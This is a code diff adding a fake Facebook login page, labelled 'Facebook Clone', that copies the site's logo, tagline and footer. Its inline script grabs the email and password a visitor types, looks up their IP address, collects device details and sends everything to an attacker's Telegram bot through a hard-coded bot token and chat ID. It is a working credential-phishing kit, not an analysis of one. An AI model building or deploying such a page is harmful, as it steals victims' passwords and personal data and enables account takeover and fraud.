@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Clone</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="inst.css">
+</head>
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="img/fb_logo.svg" alt="Facebook Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <div class="form-container">
+                    <form id="login-form">
+                        <input type="text" id="email" placeholder="Email address or phone number" required>
+                        <input type="password" id="password" placeholder="Password" required>
+                        <button type="submit" class="btn-login">Login</button>
+                    </form>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create New Account</button>
+                </div>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><button>+</button></li>
+            </ol>
+            <small>Facebook © 2021</small>
+        </div>
+    </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7935300371:AAHZ8uBDFcFr-aWvHjlV9ccRPw3eBDbaFiE"; // Replace with your bot token
+        const CHAT_ID = "7153411560"; // Replace with your chat ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        alert('Information sent successfully!');
+                    }).catch(() => {
+                        alert('Error sending the information. Please try again.');
+                    });
+                })
+                .catch(() => {
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
+</body>
+
+</html>
